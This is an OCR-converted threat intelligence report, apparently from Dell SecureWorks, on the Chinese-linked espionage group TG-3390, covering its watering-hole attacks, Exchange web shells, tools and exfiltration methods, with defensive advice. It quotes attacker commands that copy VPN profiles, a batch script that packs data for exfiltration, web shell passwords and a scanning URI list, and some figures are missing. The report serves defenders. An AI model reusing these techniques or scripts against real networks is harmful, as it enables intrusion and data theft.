Threat Group-3390 Targets Organizations for
Cyberespionage

25 minread * original

Summary

Dell SecureWorks Counter Threat Unit(TM) (CTU) researchers investigated
activities associated with Threat Group-3390[1] (TG-3390). Analysis of TG-
3390's operations, targeting, and tools led CTU researchers to assess with
moderate confidence the group is located in the People's Republic of China. The
threat actors target a wide range of organizations: CTU researchers have
observed TG-3390 actors obtaining confidential data on defense manufacturing
projects, but also targeting other industry verticals and attacking organizations
involved in international relations. The group extensively uses long-running
strategic web compromises[2] (SWCs), and relies on whitelists to deliver
payloads to select victims. In comparison to other threat groups, TG-3390 is
notable for its tendency to compromise Microsoft Exchange servers using a
custom backdoor and credential logger.

CTU researchers divided the threat intelligence about TG-3390 into two sections:
strategic and tactical. Strategic threat intelligence includes an assessment of the
ongoing threat posed by the threat group. Executives can use this assessment to
determine how to reduce risk to their organization's mission and critical assets.
Tactical threat intelligence is based on incident response investigations and
research, and is mapped to the kill chain. Computer network defenders can use
this information to reduce the time and effort associated with responding to TG-
3390.

Key points

Explanations of how CTU researchers identify attribution and gauge confidence
levels are available in the Appendix A.

e CTU researchers assess with moderate confidence that TG-3390 is based in
the People's Republic of China.




CTU researchers have evidence that the threat group compromised U.S. and
UK organizations in the following verticals: manufacturing (specifically
aerospace (including defense contractors), automotive, technology, energy,
and pharmaceuticals), education, and legal, as well as organizations focused
on international relations. Based on analysis of the group's SWCs, TG-3390
operations likely affect organizations in other countries and verticals.
TG-3390 operates a broad and long-running campaign of SWCs and has
compromised approximately 100 websites as of this publication. Through an
IP address whitelisting process, the threat group selectively targets visitors to
these websites.

After the initial compromise, TG-3390 delivers the HttpBrowser backdoor to
its victims. The threat actors then move quickly to compromise Microsoft
Exchange servers and to gain complete control of the target environment.
The threat actors are adept at identifying key data stores and selectively
exfiltrating all of the high-value information associated with their goal.

CTU researchers recommend the following practices to prevent or detect TG-
3390 intrusions:

e Search web log files for evidence of web server scanning using the URIs
listed in the Exploitation section and evidence of exfiltration using the
User-Agent in the Actions on objective section.

e Require two-factor authentication for all remote access solutions,
including OWA.

e Audit ISAPI filters and search for web shells on Microsoft Exchange
servers.

Strategic threat intelligence

CTU researchers assess the threat posed by a threat group by reviewing intent
and capability (see Figure 1). Threat groups pose varying threats to different
organizations, and even a very capable group may pose a low threat if it does not
have the intent to target a particular organization.

Intent

CTU researchers infer intent by aggregating observations, analyzing a threat
group's activity, and placing the information in a wider context.

Like many threat groups, TG-3390 conducts strategic web compromises (SWCs),
also known as watering hole attacks, on websites associated with the target
organization's vertical or demographic to increase the likelihood of finding victims
with relevant information. CTU researchers assess with high confidence that TG-
3390 uses information gathered from prior reconnaissance activities to
selectively compromise users who visit websites under its control. Most websites
compromised by TG-3390 actors are affiliated with five types of organizations
around the world:

e large manufacturing companies, particularly those supplying defense
organizations

e energy companies

e embassies in Washington, DC representing countries in the Middle East,
Europe, and Asia, likely to target U.S.-based users involved in international
relations

* non-governmental organizations (NGOs), particularly those focused on
international relations and defense

* government organizations

Based on this information, CTU researchers assess that TG-3390 aims to collect
defense technology and capability intelligence, other industrial intelligence, and
political intelligence from governments and NGOs.

Attribution

To assess attribution, CTU researchers analyze observed activity, third-party
reporting, and contextual intelligence. For the following reasons, CTU researchers
assess with moderate confidence that TG-3390 has a Chinese nexus:

e The SWC of a Uyghur cultural website suggests intent to target the Uyghur
ethnic group, a Muslim minority group primarily found in the Xinjiang region




of China. Threat groups outside of China are unlikely to target the Uyghur
people.

e TG-3390 uses the PlugxX remote access tool. The menus for PlugX's server-
side component are written exclusively in Standard Chinese (Mandarin),
suggesting that PlugX operators are familiar with this language.

e CTU researchers have observed TG-3390 activity between 04:00 and 09:00
UTC, which is 12:00 to 17:00 local time in China (UTC +8). The timeframe
maps to the second half of the workday in China.

e The threat actors have used the Baidu search engine, which is only available
in Chinese, to conduct reconnaissance activities.

e CTU researchers have observed the threat group obtaining information about
specific U.S. defense projects that would be desirable to those operating
within a country with a manufacturing base, an interest in U.S. military
capability, or both.

CTU researchers recognize that the evidence supporting this attribution is
circumstantial. It is possible that TG-3390 is false-flag operation by a threat group
outside of China that is deliberately planting indications of a Chinese origin.

Capability

To assess a threat group's capability, CTU researchers analyze its resources,
technical proficiency, and tradecraft.

Resources

TG-3390 has access to proprietary tools, some of which are used exclusively by
TG-3390 and others that are shared among a few Chinese threat groups. The
complexity and continual development of these tools indicates a mature
development process. TG-3390 can quickly leverage compromised network
infrastructure during an operation and can conduct simultaneous intrusions into
multiple environments. This ability is further demonstrated by analysis of
interactions between TG-3390 operators and a target environment. CTU
researchers found no evidence of multiple operators working simultaneously
against a single organization. This efficiency of operation (a 1:1 ratio of operator to
observed activity) suggests that TG-3390 can scale to conduct the maximum
number of simultaneous operations. These characteristics suggest that the threat
group is well resourced and has access to a tools development team and a team
focused on SWCs.




Technical proficiency

TG-3390's obfuscation techniques in SWCs complicate detection of malicious
web traffic redirects. Malware used by the threat group can be configured to
bypass network-based detection; however, the threat actors rarely modify host-
based configuration settings when deploying payloads. CTU researchers have
observed the threat actors installing a credential logger and backdoor on
Microsoft Exchange servers, which requires a technical grasp of Internet
Information Services (IIS). TG-3390 uses older exploits to compromise targets,
and CTU researchers have not observed the threat actors using zero-day exploits
as of this publication. The threat actors demonstrated the ability to adapt when
reentering a network after an eviction, overcoming technical barriers constructed
by network defenders.

Tradecraft

In addition to using SWCs to target specific types of organizations, TG-3390 uses
spearphishing emails to target specific victims. CTU researchers assess with high
confidence that the threat actors follow an established playbook during an
intrusion. They quickly move away from their initial access vector to hide their
entry point and then target Exchange servers as a new access vector. As of this
publication, CTU researchers have not discovered how TG-3390 keeps track of
the details associated with its compromised assets and credentials. However, the
threat actors’ ability to reuse these assets and credentials, sometimes weeks or
months after the initial compromise, indicates the group is disciplined and well
organized. After gaining access to a target network in one intrusion analyzed by
CTU researchers, TG-3390 actors identified and exfiltrated data for specific
projects run by the target organization, indicating that they successfully obtained
the information they sought. Data exfiltration occurred almost four weeks after
the initial compromise and continued for two weeks (see Figure 2).

Note: The adversary’'s end goal is to exfiltrate, not infiltrate. Organizations often miss multiple
opportunities to detect and disrupt the threat actors before they can achieve their objective. Alerts
for credential theft tools and privileged account lockouts should be investigated.

Tactical threat intelligence
Known tools

CTU researchers have observed TG-3390 actors using tools that are favored by
multiple threat groups:

e PlugX — A remote access tool notable for communications that may contain
HTTP headers starting with "X-" (e.g., "X-Session: 0"). Its presence ona
compromised system allows a threat actor to execute a wide variety of
commands, including uploading and downloading files, and spawning a
reverse shell. The malware can be configured to use multiple network
protocols to avoid network-based detection. DLL side loading is often used to
maintain persistence on the compromised system.

e HttpBrowser (also known as TokenControl) — A backdoor notable for HTTPS
communications with the HttpBrowser/1.0 User-Agent (see Figure 3).
HttpBrowser's executable code may be obfuscated through structured
exception handling and return-oriented programming. Its presence ona
compromised system allows a threat actor to spawn a reverse shell, upload
or download files, and capture keystrokes. Antivirus detection for
HttpBrowser is extremely low and is typically based upon heuristic
signatures. DLL side loading has been used to maintain persistence on the
compromised system. More information about HttpBrowser is available in
Appendix B.

e ChinaChopper web shell — A web-based executable script (see Figure 4) that
allows a threat actor to execute commands on the compromised system. The
server-side component provides a simple graphical user interface for threat
actors interacting with web shells.

Passwords, like "admin-na-google123!@#" shown in Figure 4, are required to
interact with the web shell. TG-3390 has used additional web shells
containing similarly formatted passwords.

e Hunter — A web application scanning tool written by @tojen to identify
vulnerabilities in Apache Tomcat, Red Hat JBoss Middleware, and Adobe
ColdFusion (see Figure 5). It can also identify open ports, collect web banners,
and download secondary files.

The following tools appear to be exclusive to TG-3390:

¢ OwaAuth web shell — A web shell and credential stealer deployed to
Microsoft Exchange servers. It is installed as an ISAPI filter. Captured
credentials are DES-encrypted using the password "12345678" and are
written to the log.txt file in the root directory. Like the ChinaChopper web
shell, the OwaAuth web shell requires a password. However, the OwaAuth
web shell password contains the victim organization's name. More
information about the OwaAuth web shell is available in Appendix C.

e ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6). It is
deployed to internally accessible servers running Internet Information
Services (IIS).

TG-3390 actors have also used the following publicly available tools:

e Windows Credential Editor (WCE) — obtains passwords from memory
e gsecdump — obtains passwords from memory

* winrar — compresses data for exfiltration

e nbtscan — scans NetBIOS name servers

Tactics, techniques, and procedures

Incident response engagements have given CTU researchers insight into the
tactics TG-3390 employs during intrusions.

Reconnaissance

CTU researchers have not observed TG-3390 actors performing reconnaissance
prior to compromising organizations. As discussed in the Actions on objectives
section, the threat actors appear to wait until they have established a foothold.

Development

TG-3390 actors use command and control (C2) domains for extended periods of
time but frequently change the domains’ IP addresses. The new IP addresses are
typically on the same subnet as the previous ones.

TG-3390 is capable of using a C2 infrastructure that spans multiple networks and
registrars. The most common registrar used by the adversary is HiChina Zhicheng
Technology Ltd. The threat actors have a demonstrated ability to move from one
network provider to another, using some infrastructure for extended periods of
time and other domains for only a few days. Seemingly random activity patterns
in infrastructure deployment and usage, along with the ability to use a wide
variety of geographically diverse infrastructure, help the threat actors avoid
detection.

TG-3390 SWCs may be largely geographically independent, but the group's most
frequently used C2 registrars and IP net blocks are located in the U.S. Using a U.S.-
based C2 infrastructure (see Figure 7) to compromise targets in the U.S. helps
TG-3390 actors avoid geo-blocking and geo-flagging measures used in network
defense.




ay

dark green signifies a high count of C2 registrars and IP net blocks, while the light
green represents a smaller count. (Source: Dell SecureWorks)

The threat actors create PlugX DLL stub loaders that will run only after a specific
date. The compile dates of the samples analyzed by CTU researchers are all later
than the hard-coded August 8, 2013 date, indicating that the code might be
reused from previous tools.

The OwaAuth web shell is likely created with a builder, given that the PE compile
time of the binary does not change between instances and the configuration
fields are padded to a specific size. The adversaries modify publicly available
tools such as ASPXSpy to remove identifying characteristics that network
defenders use to identify web shells.

Weaponization

As of this publication, CTU researchers are unsure if TG-3390 relies on
weaponizers to package tools and exploits.

Delivery




TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive
attachments. The ZIP archives have names relevant to the targets and contain
both legitimate files and malware. One archive sample analyzed by CTU
researchers contained a legitimate PDF file, a benign image of interest to targets
(see Figure 8), and an HttpBrowser installer disguised as an image file.

In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards
packed JavaScript code shown in Figure 9 to the end of a legitimate website's
menu page.

width=0 height=0></iframe>");

Figure 10. Unpacked JavaScript code. (Source: Dell SecureWorks)

Both the redirect code on the compromised site and the exploit code appear and
disappear, indicating that the adversaries add the code when they want to
leverage the SWC and remove the code when it is not in use to limit the visibility
of their operations. The threat actors have evolved to whitelisting IP addresses
and only delivering the exploit and payload to specific targets of interest. CTU
researchers have observed TG-3390 compromising a target organization's




externally and internally accessible assets, such as an OWA server, and adding
redirect code to point internal users to an external website that hosts an exploit
and delivers malware.

Exploitation

TG-3390 actors have used Java exploits in their SWCs. In particular, the threat
actors have exploited CVE-2011-3544, a vulnerability in the Java Runtime
Environment, to deliver the HttpBrowser backdoor; and CVE-2010-0738, a
vulnerability in JBoss, to compromise internally and externally accessible assets
used to redirect users’ web browsers to exploit code.

In activity analyzed by CTU researchers, TG-3390 executed the Hunter web
application scanning tool against a target server running IIS. Hunter queried the
following URIs in a specific order to determine if the associated software
configurations are insecure, and all queries contained the HttpClient User-Agent:

e GET /manager/html/ — Tomcat web application manager
¢ GET /jmx-console/ — JBoss configuration
¢ GET /CFIDE/administrator/login.cfm — ColdFusion configuration

Installation

TG-3390 uses DLL side loading, a technique that involves running a legitimate,
typically digitally signed, program that loads a malicious DLL. CTU researchers
have observed the threat actors employing legitimate Kaspersky antivirus
variants in analyzed samples. The DLL acts as a stub loader, which loads and
executes the shell code. The adversaries have used this technique to allow PlugxX
and HttpBrowser to persist on a system.




Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of
backdoors. The challenge is detecting known good software loading and running malware. As
security controls have improved, DLL side loading has evolved to load a payload stored in a different
directory or from a registry value.

In other cases, threat actors placed web shells on externally accessible servers,
sometimes behind a reverse proxy, to execute commands on the compromised
system. TG-3390 actors have deployed the OwaAuth web shell to Exchange
servers, disguising it as an ISAPI filter. The IIS w3wp.exe process loads the
malicious DLL, which CTU researchers have observed in the Program
Files\Microsoft\Exchange Server\ClientAccess\Owa\Bin directory.

Command and contro!

To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53,
80, and 443. The PlugX malware can be configured to use HTTP, DNS, raw TCP, or
UDP to avoid network-based detection. In one sample analyzed by CTU
researchers, PlugX was configured with hard-coded user credentials to bypass a
proxy that required authentication. Newer HttpBrowser versions use SSL with
self-signed certificates to encrypt network communications.

TG-3390 actors frequently change the C2 domain's A record to point to the
loopback IP address 127.0.0.1, which is a variation of a technique known as
"parking." Other variations of parking point the IP address to Google's recursive
name server 8.8.8.8, an address belonging to Confluence, or to other non-routable
addresses. When the adversaries’ operations are live, they modify the record
again to point the C2 domain to an IP address they can access. A domain name
parking example is available in Appendix D.

Actions on objective

CTU researchers have discovered numerous details about TG-3390 operations,
including how the adversaries explore a network, move laterally, and exfiltrate
data. As shown in Figure 11, after compromising an initial victim's system (patient
0), the threat actors use the Baidu search engine to search for the victim's
organization name. They then identify the Exchange server and attempt to install
the OwaAuth web shell. If the OwaAuth web shell is ineffective because the
victim uses two-factor authentication for webmail, the adversaries identify other
externally accessible servers and deploy ChinaChopper web shells. Within six
hours of entering the environment, the threat actors compromised multiple
systems and stole credentials for the entire domain.

The threat actors use the Hunter and nbtscan tools, sometimes renamed, to
conduct network reconnaissance for vulnerable servers and online systems (see
Figure 12). TG-3390 actors favor At.exe to create scheduled tasks for executing
commands on remote systems.

exit

Dell SecureWorks)

Over a few days’ span, the threat actors install remote access tools on additional
systems based upon the results of the network reconnaissance. They use At.exe
to schedule tasks to run self-extracting RAR archives, which install either
HttpBrowser or PlugX. CTU researchers observed the threat actors collecting
Cisco VPN profiles to use when accessing the victim's network via VPN (see
Figure 13).

"cmd" /c cd /d “c:\Windows\Temp\"&copy \\ (REDACTED) \c$\programdata\*.pcf

Figure 13. Copying of .pcf files. (Source: Dell SecureWorks)

To facilitate lateral movement, the adversaries deploy ASPXTool web shells to
internally accessible systems running IIS.




CTU researchers have observed the threat actors encrypting data using the
password “admin-windows2014" and splitting the RAR archives into parts in the
recycler directory, with the same name as the uncompressed data (see Figure 14).

@echo off

c:\windows\temp\svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014
“e:\recycler\REDACTED.rar" “e:\ProgramData\REDACTED\"

exit

Figure 14. Batch script used to archive data. (Source: Dell SecureWorks)

The number at the end of the password corresponds to the year of the intrusion.
For example, the password "admin-windows2014" shown in Figure 14 was
changed to "admin-windows2015" for TG-3390 intrusions conducted in 2015.




Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data
for exfiltration in uncommon directories. In some instances, adversaries exceed disk space limits
during the exfiltration process, requiring the staging of archives on multiple systems. Unexplained
disk quota alerts on typically underutilized systems warrants immediate investigation.

Another batch script run by a scheduled task renames the archives on the file
server (see Figure 15).

@echo off

pushd e:\recycler\
ren *.rar *.zip
exit

Figure 15. Batch script used to rename exfiltrated data. (Source: Dell SecureWorks)

CTU researchers have observed TG-3390 actors staging RAR archives, renamed
with a.zip file extension, on externally accessible web servers. The adversaries
then issue HTTP GET requests, sometimes with the User-Agent MINIXL, to
exfiltrate the archive parts from the victim's network (see Figure 16).

In other intrusions, data was exfiltrated using the PlugX remote access tool.

with TG-3390's re-entry into a network. Approximately 300 GB of data was
exfiltrated during that span.

Response to eviction

Successfully evicting TG-3390 from an environment requires a coordinated plan
to remove all access points, including remote access tools and web shells. Within
weeks of eviction, the threat actors attempt to access their ChinaChopper web
shells from previously used IP addresses. Finding the web shells inaccessible, the
adversaries search google.co.jp for remote access solutions. CTU researchers
discovered the threat actors searching for "[company] login," which directed
them to the landing page for remote access. TG-3390 attempts to reenter the
environment by identifying accounts that do not require two-factor
authentication for remote access solutions, and then brute forcing usernames and




passwords. After reestablishing access, the adversaries download tools such as
gsecudmp and WCE that are staged temporarily on websites that TG-3390
previously compromised but never used. CTU researchers believe legitimate
websites are used to host tools because web proxies categorize the sites as

benign.




Note: Numerous threat groups use legitimate remote access solutions (VPN, Citrix, OWA, etc.) to
enter or reenter a network. After executing an eviction plan, it is paramount to reset all credentials,
including those for third-party accounts, preferably after implementing two-factor authentication.

TG-3390 actors keep track of and leverage existing ASPXTool web shells in their
operations, preferring to issue commands via an internally accessible web shell
rather than HttpBrowser or PlugxX. After reentering an environment, the threat
actors focus on obtaining the active directory contents. Figure 19 shows a timeline
of TG-3390 attempting to regain a foothold in a network in a span of only five
hours.

Note: Relying primarily on network-based security controls will not deter most threat groups from
achieving their objective. Adversaries can overcome blacklisted infrastructure in minutes, as TG-
3390 actors did when they staged tools on compromised web servers.

Analysis of the OwaAuth web shell revealed a PDB string with the "SyberSpace"
username (see Figure 20).

C:\Users\SyberSpace\Desktop\owa\EttpsExts\HttpsExts\HttpsExts\obj \Release\OwaAuth. pdb

Further research revealed additional tools containing the same username (see
Figure 21).

: \Users\SyberSpace\Desktop\Uac\Release\Uac.pdb

: \Users\SyberSpace\Desktop\code\Release\code. pdb

: \Users\SyberSpace\Desktop\Local\Release\Local.pdb

: \Users\SyberSpace\Desktop\gsecdump\hashdump\Release\hashdump. pdb

: \Users\SyberSpace\Desktop\inline_asm_vc\test\Release\test.pdb

: \Users\SyberSpace\Desktop\RemCom_SRC_1.2\RemCom\Release\RemCom. pdb

CTU researchers have no evidence to determine if these tools are also used by
TG-3390.

Conclusion

TG-3390 is known for compromising organizations via SWCs and moving quickly
to install backdoors on Exchange servers. Despite the group's proficiency, there
are still many opportunities to detect and disrupt its operation by studying its
modus operandi. The threat actors work to overcome existing security controls, or
those put in place during an engagement, to complete their mission of exfiltrating
intellectual property. Due to TG-3390's determination, organizations should
formulate a solid eviction plan before engaging with the threat actors to prevent
them from reentering the network.

Table 1. TG-3390 indicators.

Appendix A — Identifying attribution and gauging confidence




Identifying attribution

In most cases, CTU researchers not have intelligence to directly attribute a threat
group, so attribution relies on circumstantial evidence and is an assessment
rather than a fact. CTU researchers draw on three distinct intelligence bases for
evidence of attribution:

e Observed activity is gathered from CTU researchers’ observation and
investigation of a threat group's activity on a target network and across Dell
SecureWorks data, and analysis of tactics, techniques, and procedures (TTPs)
the threat group employs.

e Third-party intelligence is gained from trusted relationships within the
security industry and with other private and public sector organizations, as
well as analysis of open source intelligence.

¢ Contextual analysis compares threat group targets against intelligence
requirements of nation states and other threat actors and compares
tradecraft employed by a threat group to tradecraft of known threat actors.

Gauging confidence level

CTU researchers have adopted the grading system published by the U.S. Office of
the Director of National Intelligence to indicate confidence in their assessments:

¢ High confidence generally indicates that judgments are based on high-
quality information, and/or that the nature of the issue makes it possible to
render a solid judgment. A "high confidence" judgment is not a fact or a
certainty, however, and such judgments still carry a risk of being wrong.

¢ Moderate confidence generally means that the information is credibly
sourced and plausible but not of sufficient quality or corroborated sufficiently
to warrant a higher level of confidence.

e Low confidence generally means that the information's credibility and/or
plausibility is questionable, or that the information is too fragmented or
poorly corroborated to make solid analytic inferences, or that [there are]
significant concerns or problems with the sources.

Appendix B — HttpBrowser analysis

HttpBrowser is a remote access tool whose name originates from the hard-coded
"HttpBrowser/1.0" User-Agent. CTU researchers also identified a PDB string in the
binaries, J:\TokenControlV3\ServerDIl\Release\ServerDIl.pdb, which implies that




the threat actors may refer to the tool as "TokenControl." Table 2 lists the
commands available to threat actors in one of the HttpBrowser variants.

Appendix C — OwaAuth web shell analysis

OwadAuth is a web shell that is installed as an ISAPI filter on Exchange servers and
shares characteristics with the ChinaChopper web shell. Like ChinaChopper, it
parses HTTP requests for the Z1 and Z2 parameters (see Table 4). The legitimate
owaauth.dll file resides in %ProgramFiles%\Microsoft\Exchange
Server\ClientAccess\Owa\Auth\ while CTU researchers have observed the
backdoor using the same filename in the %ProgramFiles%\Microsoft\Exchange
Server\ClientAccess\Owa\bin\ directory. In addition to acting as a web shell, the
malware captures and DES-encrypts credentials before writing the username and
password to disk. The OwaAuth web shell enables a threat actor to upload and
download files, launch processes, and execute SQL queries.

Each web shell instance is configured to contain SP, Key, and Log variables. The SP
variable is a string containing the victim's username. When the malicious ISAPI
filter captures a username matching this variable, it knows to handle the
incoming HTTP request as a command to the web shell. The DES key to encrypt
the credentials in the configuration observed by CTU researchers is 12345678,
and the log file is c:\log.txt. The decrypted contents of the log file adhere to the
format in Figure 22.

<Randon number (0..99800i)>\t<Current Date/Tine>\t<User'siP>\t<Logontsernaze>\t<LogonPassword>\t<Brouwser User-aAgent>

Appendix D — Domain name parking example

CTU researchers have observed TG-3390 parking domains by pointing their A
record to a non-routable IP space, including the 127.0.0.[x] loopback address.
Table 5 demonstrates how the threat actors change one of their C2 domains to
point to routable and non-routable IP addresses over time.

Endnotes

[1] The Dell SecureWorks Counter Threat Unit(TM) (CTU) research team tracks
threat groups by assigning them four-digit randomized numbers (3390 in this
case), and compiles information from first-hand incident response observations
and from external sources.

[2] Threat groups use strategic web compromises (SWCs), also known as
watering hole attacks, to target a wide array of potential victims. Threat actors
compromise a website used by their target demographic (e.g., compromising a
website specializing in oil and gas industry news when targeting the energy
vertical). Visitors to the compromised website are redirected to a server under
the threat group's control, where their system is compromised with the threat
group's malware. With this tactic, a threat group increases the likelihood of
compromising systems that possess desired information.
